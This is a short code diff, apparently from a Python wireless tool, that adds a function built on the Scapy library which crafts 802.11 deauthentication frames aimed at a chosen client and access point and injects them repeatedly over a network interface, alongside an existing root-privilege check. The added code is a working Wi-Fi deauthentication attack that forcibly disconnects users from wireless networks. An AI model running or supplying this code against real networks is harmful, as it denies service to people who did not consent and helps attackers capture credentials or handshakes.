@@ -26,5 +26,12 @@ def get_arguments(*args):
 
 def check_root():
     return geteuid() == 0
+
+def sendDeauthenticationFrame(ssid, client, iface, count, interval):
+    dot11 = Dot11(type=0, subtype=12, addr1=client, addr2=ssid, addr3=ssid)
+    deauthentication_layer = Dot11Deauth(reason=7)
+    packet = RadioTap() / dot11 / deauthentication_layer
+    sendp(packet, iface=iface, count=count, inter=interval, verbose=True)
+
 if __name__ == "__main__":
     pass
